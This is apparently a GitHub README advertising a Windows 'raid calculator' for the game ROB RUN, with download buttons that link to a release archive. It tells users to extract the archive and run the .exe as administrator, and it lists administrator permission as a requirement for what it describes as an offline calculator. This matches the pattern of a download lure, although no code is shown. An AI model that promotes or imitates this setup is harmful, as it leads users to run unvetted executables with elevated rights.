# ROB RUN Raid Calculator

![Windows](https://img.shields.io/badge/Platform-Windows%2010%2F11-0078D6?style=flat-square&logo=windows&logoColor=white)
![Version](https://img.shields.io/badge/Version-1.0.0-brightgreen?style=flat-square)
![Downloads](https://img.shields.io/badge/Downloads-New-blue?style=flat-square)
![License](https://img.shields.io/badge/License-MIT-blue?style=flat-square)

Desktop raid planner for ROB RUN — calculates decoder requirements, estimates loot value, and tracks laundering timers for solo players.

<div align="center">

[![Download for Windows](https://img.shields.io/badge/%E2%AC%87%EF%B8%8F%20Download%20v1.0.0-2EA043?style=for-the-badge&logo=windows&logoColor=white)](https://github.com/GeneralAlternator/robrun-raid-calculator-2026/releases/tag/1.0.0)

</div>

---

## ⚡ At a Glance

| | |
|---|---|
| **What it is** | Raid planner and decoder calculator for ROB RUN |
| **Who it's for** | Solo players who want to raid bases without wasting decoders |
| **What it solves** | Decoder math is opaque; wrong guesses waste expensive equipment |
| **How it works** | Input building type and fuse rarity, get exact decoder count |

---

## 🔥 Why This Exists

ROB RUN launched on November 4, 2026, and hit **547,900 concurrent players** on November 15. The game is free-to-play, but raiding other players' bases is where the real money is. And raiding requires **decoders**.

The problem: decoder requirements depend on building type and fuse rarity. A concrete fence with legendary fuses needs **55 decoders**. A trailer with green fuses needs **2**. Players guess, waste decoders on empty bases, and run out halfway through a raid.

This calculator does the math before you commit.

---

## 🧩 What It Does

### Decoder Calculator
- Select building type: Trailer, Small House, Garage, Warehouse, Mansion, etc.
- Select fuse rarity: Green (1 point), Purple (3 points), Legendary (5 points)
- Returns exact decoder count needed for full breach

### Raid Profit Estimator
- Input visible structures: Growhouse, Safe, Metal Fence, Multiple Buildings
- Calculator estimates potential loot value based on community data
- Suggests whether the raid is worth the decoder cost

### Laundering Timer
- Laundering Desk processes **$450 every 30 seconds**
- Input dirty cash amount, get processing time
- Track multiple batches simultaneously
- Optional sound alert when batch completes

---

## 💻 System Requirements

| Component | Minimum | Recommended |
| :--- | :--- | :--- |
| **OS** | Windows 10 (64-bit) | Windows 11 |
| **RAM** | 4 GB | 8 GB |
| **Storage** | 50 MB | 100 MB |
| **Runtime** | .NET 8.0 (bundled) | .NET 8.0 |
| **Game** | ROB RUN (Steam, F2P) | Latest patch |
| **Permissions** | Administrator | Administrator |

---

## 🚀 Quick Start

1. **Download** the archive using the button above
2. **Extract** with 7-Zip or WinRAR
3. **Run** `RaidCalculator.exe` as administrator
4. **Select** building type and fuse rarity
5. **Get** exact decoder count and profit estimate

---

## ❓ FAQ

**Does this interact with the game?**
No — it's a standalone calculator. No memory reading, no injection, no game file modification.

**Will I get banned?**
ROB RUN uses Easy Anti-Cheat, but this calculator does not interact with the game process. It's a separate desktop app, like using a spreadsheet.

**How accurate are the decoder numbers?**
Based on community-documented values for building defense and fuse points. The game may patch these numbers — the calculator will be updated.

**Does it work offline?**
Yes — all calculations are local. No internet required.

**Does it include laundering for BCoin?**
The calculator focuses on dirty cash laundering. BCoin exchange rates are not included.

**How do I uninstall?**
Delete the folder. No registry entries.

---

## 🗺️ Roadmap

- [ ] Server wipe timer (7-day cycle)
- [ ] Decoder crafting cost calculator
- [ ] Multi-base raid planner
- [ ] Community-shared profit data

---

## 📄 License

MIT License — see [LICENSE](LICENSE) for details.

---

<div align="center">

[![Download for Windows](https://img.shields.io/badge/%E2%AC%87%EF%B8%8F%20Download%20v1.0.0-2EA043?style=for-the-badge&logo=windows&logoColor=white)](https://github.com/GeneralAlternator/robrun-raid-calculator-2026/releases/tag/1.0.0)

**Version 1.0.0** — Raid Calculator · Decoder Math · MIT

</div>
